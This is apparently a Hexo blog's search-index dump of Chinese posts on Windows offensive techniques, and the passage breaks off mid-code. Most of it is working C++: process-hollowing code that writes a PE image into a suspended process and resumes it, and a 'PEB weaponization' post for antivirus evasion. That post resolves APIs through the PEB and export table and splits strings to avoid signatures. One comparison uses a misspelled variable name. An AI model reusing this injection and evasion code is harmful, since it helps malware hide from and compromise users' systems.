<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取要执行的进程</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(TARGETFILE, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID lpBuffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == lpBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD lpNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpBuffer, dwFileSize, &amp;lpNumberOfBytesRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, *(<span class="type">short</span>*)lpBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析PE</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = <span class="built_in">PIMAGE_DOS_HEADER</span>(lpBuffer);</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取挂起进程上下文</span></span><br><span class="line">    CONTEXT ctx = &#123;&#125;;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">    <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取挂起进程的映像基址</span></span><br><span class="line">    LPVOID lpOldImageBase = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// (ctx.Rdx + (sizeof(SIZE_T) * 2) =&gt; ctx.Rdx + 0x10 =&gt; PEB + 0x10 = ImageBaseAddress</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;lpOldImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadProcessMemory To lpOldImageBase Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断文件预期加载地址是否被占用</span></span><br><span class="line">    FnNtUnmapViewOfSection fnNtUnmapViewOfSection = (FnNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((SIZE_T)lpOldImageBase == pNt-&gt;OptionalHeader.ImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fnNtUnmapViewOfSection</span>(pi.hProcess, lpOldImageBase); <span class="comment">// 卸载已存在的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 为可执行映像分配内存, 写入PE文件头</span></span><br><span class="line">    LPVOID lpTargetMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == lpTargetMemory)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)));</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), (PVOID)((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将Rcx寄存器设置为入口点</span></span><br><span class="line">    ctx.Rcx = (SIZE_T)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Rdx + (<span class="built_in">sizeof</span>(SIZE_T) * <span class="number">2</span>)), &amp;pNt-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SetThreadContext(pi.hThread, &amp;ctx);</span></span><br><span class="line">    MySetThreadContext mySetThreadContext = (MySetThreadContext)<span class="built_in">DynamicCall</span>();</span><br><span class="line">    <span class="keyword">if</span> (mySetThreadContext == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DynamicCall Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mySetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShellCode原理及编写</title>
      <link href="/29c16d52.html"/>
      <url>/29c16d52.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>Shellcode原理及编写</p></div><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PEB武器化</title>
      <link href="/15d21ffc.html"/>
      <url>/15d21ffc.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>基于对<code>Windows TEB/PEB</code>的分析, 可以做一些免杀中的应用</p></div><span id="more"></span><h2 id="动态获取API"><a href="#动态获取API" class="headerlink" title="动态获取API"></a>动态获取API</h2><blockquote><p>通过对<code>Windows TEB/PEB</code>的分析, 可以获取到KERNEL32.dll的基址, 然后解析PE, 遍历导出表获取<code>GetProcAddress</code>函数地址, 再使用<code>GetProcAddress</code>函数获取其他函数地址</p></blockquote><h3 id="x32位动态获取API"><a href="#x32位动态获取API" class="headerlink" title="x32位动态获取API"></a>x32位动态获取API</h3><blockquote><p>32位下通过fs:[0]寄存器获取<code>TEB</code>, 然后偏移<code>0x30</code>得到PEB;</p></blockquote><h4 id="解析TEB-PEB获取KERNEL32-dll基址"><a href="#解析TEB-PEB获取KERNEL32-dll基址" class="headerlink" title="解析TEB&#x2F;PEB获取KERNEL32.dll基址"></a>解析TEB&#x2F;PEB获取KERNEL32.dll基址</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TEB结构体</span></span><br><span class="line">_TEB* pTeb = <span class="built_in">NtCurrentTeb</span>();        <span class="comment">// 指向当前线程的线程环境块的指针</span></span><br><span class="line"><span class="comment">// PEB结构体</span></span><br><span class="line">PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + <span class="number">0x30</span>);      <span class="comment">// 偏移0x30得到PEB</span></span><br><span class="line"><span class="comment">// LDR结构体</span></span><br><span class="line">PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + <span class="number">0x0c</span>);      <span class="comment">// PEB偏移0x0c得到_PEB_LDR_DATA</span></span><br><span class="line"><span class="comment">// 进程所有模块</span></span><br><span class="line">PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + <span class="number">0x0c</span>); <span class="comment">// _PEB_LDR_DATA偏移0x0c得到InLoadOrderModuleList</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 主模块</span></span><br><span class="line">PDWORD pModExe = (PDWORD)*pInLoadOrderLinks;        <span class="comment">// 第一个为主模块（程序本身）</span></span><br><span class="line"><span class="comment">// NtDll</span></span><br><span class="line">PDWORD pModNtDll = (PDWORD)*pModExe;                <span class="comment">// 第二个为ntdll.dll</span></span><br><span class="line"><span class="comment">// Kernel32Dll</span></span><br><span class="line">PDWORD pModKernel32 = (PDWORD)*pModNtDll;           <span class="comment">// 第三个为KERNEL32.dll</span></span><br><span class="line"><span class="comment">// 基址</span></span><br><span class="line">dwKernel32 = pModKernel32[<span class="number">6</span>];                       <span class="comment">// 偏移0x18 =&gt; 24 / 4 = 6 其中第6个为基址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Kernel32 Base: %08x %S\n&quot;</span>, dwKernel32, (<span class="type">const</span> <span class="type">char</span>*)pModKernel32[<span class="number">12</span>]);</span><br></pre></td></tr></table></figure><h4 id="解析PE-获取GetProcAddress"><a href="#解析PE-获取GetProcAddress" class="headerlink" title="解析PE, 获取GetProcAddress"></a>解析PE, 获取GetProcAddress</h4><blockquote><p>获取到KERNEL32.dll基址, 通过解析PE遍历KERNEL32.dll的导出表获取到<code>GetProcAddress</code>函数地址;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析pe文件</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernel32;</span><br><span class="line"><span class="comment">// 解析NtHeader</span></span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + dwKernel32);</span><br><span class="line"><span class="comment">// 定位导出表</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pExportDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line"><span class="comment">// 解析导出表</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pExportDir-&gt;VirtualAddress + dwKernel32);</span><br><span class="line"><span class="comment">// 获取函数地址表</span></span><br><span class="line">PDWORD dwAddrOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + dwKernel32);</span><br><span class="line"><span class="comment">// 获取函数序号表</span></span><br><span class="line">PWORD dwAddrOfNameOrds = (PWORD)(pExport-&gt;AddressOfNameOrdinals + dwKernel32);</span><br><span class="line"><span class="comment">// 获取函数名称表</span></span><br><span class="line">PDWORD dwAddrOfNames = (PDWORD)(pExport-&gt;AddressOfNames + dwKernel32);</span><br><span class="line"><span class="comment">// 获取函数名称总数</span></span><br><span class="line">DWORD dwNumOfNames = (DWORD)pExport-&gt;NumberOfNames;</span><br><span class="line">DWORD dwGetProcAddress = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 通过遍历函数名称总数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取函数名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* szFuncName = (<span class="type">char</span>*)(dwAddrOfNames[i] + dwKernel32);</span><br><span class="line">    <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="type">char</span> szGetProcAddress[] = &#123; <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> nFlags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">14</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (szFuncName[j] == szGetProAddress[j])</span><br><span class="line">        &#123;</span><br><span class="line">            nFlags++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nFlags == <span class="number">14</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            dwGetProcAddress = (DWORD)(dwAddrOfFunctions[dwAddrOfNameOrds[i]] + dwKernel32);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义相关函数字符串以及函数原型并调用"><a href="#定义相关函数字符串以及函数原型并调用" class="headerlink" title="定义相关函数字符串以及函数原型并调用"></a>定义相关函数字符串以及函数原型并调用</h4><blockquote><p>定义函数名称时不能使用常量字符串, 因为程序会将字符串放在常量区段, 所以要对字符串进行<code>打散</code>处理, 以这种方式定义会将字符串存放在堆栈区域;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义LoadLibraryW函数字符串</span></span><br><span class="line"><span class="type">char</span> szLoadLibraryW[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义MessageBoxW函数字符串</span></span><br><span class="line"><span class="type">char</span> szMessagesBoxW[] = &#123; <span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义KERNEL32.dll字符串</span></span><br><span class="line"><span class="type">char</span> szKernel32[] = &#123; <span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义ExitProcess函数字符串</span></span><br><span class="line"><span class="type">char</span> szExitProcss[] = &#123; <span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义user32.dll字符串</span></span><br><span class="line">WCHAR szUser32[] = &#123; <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">WCHAR szDokey[] = &#123; <span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义LoadLibraryW函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* MyLoadLibraryW)</span><span class="params">(_In_ LPCWSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="comment">// 定义GetProcAddress函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* MyGetProcAddress)</span><span class="params">(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="comment">// 定义MessageBoxW函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* MyMessageBoxW)</span><span class="params">(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType)</span></span>;</span><br><span class="line"><span class="comment">// 定义ExitProcess函数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(WINAPI* MyExitProcess)</span><span class="params">(_In_ UINT uExitCode)</span></span>;</span><br><span class="line">HMODULE hKernel = (HMODULE)dwKernel32;</span><br><span class="line"></span><br><span class="line">MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;</span><br><span class="line"><span class="keyword">if</span> (pFuncGetProcAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)<span class="built_in">pFuncGetProcAddress</span>(hKernel, szLoadLibraryW);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pFuncLoadLibraryW)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">HMODULE hUser32 = <span class="built_in">pFuncLoadLibraryW</span>((LPCWSTR)szUser32);</span><br><span class="line">MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)<span class="built_in">pFuncGetProcAddress</span>(hUser32, szMessagesBoxW);</span><br><span class="line"><span class="built_in">pFuncMessageBoxW</span>(<span class="literal">NULL</span>, szDokey, (LPCWSTR)szDokey, MB_OK);</span><br><span class="line">MyExitProcess pFuncExitProcess = (MyExitProcess)<span class="built_in">pFuncGetProcAddress</span>(hKernel, szExitProcss);</span><br><span class="line"><span class="built_in">pFuncExitProcess</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="x64位动态获取API"><a href="#x64位动态获取API" class="headerlink" title="x64位动态获取API"></a>x64位动态获取API</h3><blockquote><p>64位下通过gs:[0]寄存器获取TEB, 然后偏移<code>0x60</code>得到PEB; 64位下和32位获取方式不同;</p></blockquote><h4 id="解析TEP-PEB获取KERNEL32-dll基址"><a href="#解析TEP-PEB获取KERNEL32-dll基址" class="headerlink" title="解析TEP&#x2F;PEB获取KERNEL32.dll基址"></a>解析TEP&#x2F;PEB获取KERNEL32.dll基址</h4><blockquote><p>需要包含<code>winternl.h</code>和<code>intrin.h</code>两个头文件;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 通过PEB获取KERNEL32.dll基址</span></span><br><span class="line">PVOID pPeb = <span class="built_in">reinterpret_cast</span>&lt;PVOID&gt;(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line"><span class="keyword">if</span> (!pPeb)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算Ldr地址的偏移量</span></span><br><span class="line">ULONG64 ldrOrder = <span class="number">0x18</span>;</span><br><span class="line"><span class="comment">// 获取_PEB_LDR_DATA</span></span><br><span class="line">PVOID pLdr = *<span class="built_in">reinterpret_cast</span>&lt;PVOID*&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pPeb) + ldrOrder);</span><br><span class="line"><span class="keyword">if</span> (!pLdr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算InMemoryOrderModuleList地址的偏移量</span></span><br><span class="line">ULONG64 moduleListOffset = <span class="built_in">offsetof</span>(PEB_LDR_DATA, InMemoryOrderModuleList);</span><br><span class="line"><span class="comment">// 计算InMemoryOrderModuleList地址</span></span><br><span class="line">PLIST_ENTRY pModList = <span class="built_in">reinterpret_cast</span>&lt;PLIST_ENTRY&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pLdr) + moduleListOffset);</span><br><span class="line"><span class="comment">// 获取KERNEL32.dll基址</span></span><br><span class="line">PLIST_ENTRY pKernel32Entry = pModList-&gt;Flink-&gt;Flink-&gt;Flink;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pKernelTableEntry = <span class="built_in">CONTAINING_RECORD</span>(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">   <span class="comment">// 获取KERNEL32.dll基址</span></span><br><span class="line">PVOID pKernelBase = pKernelTableEntry-&gt;DllBase;</span><br></pre></td></tr></table></figure><h4 id="解析PE-获取GetProcAddress-1"><a href="#解析PE-获取GetProcAddress-1" class="headerlink" title="解析PE, 获取GetProcAddress"></a>解析PE, 获取GetProcAddress</h4><blockquote><p>和32位一样, 解析PE遍历导出表获取<code>GetProcAddress</code>函数地址;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 解析PE</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase;</span><br><span class="line">   <span class="comment">// 获取NT头</span></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pKernelBase);</span><br><span class="line"><span class="comment">// 获取导出表虚拟地址</span></span><br><span class="line">   PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line"><span class="comment">// 通过导出表虚拟地址获取导出表</span></span><br><span class="line">   PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pKernelBase);</span><br><span class="line">   <span class="comment">// 获取函数地址表</span></span><br><span class="line">PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pKernelBase);</span><br><span class="line"><span class="comment">// 获取函数名称表</span></span><br><span class="line">   PDWORD 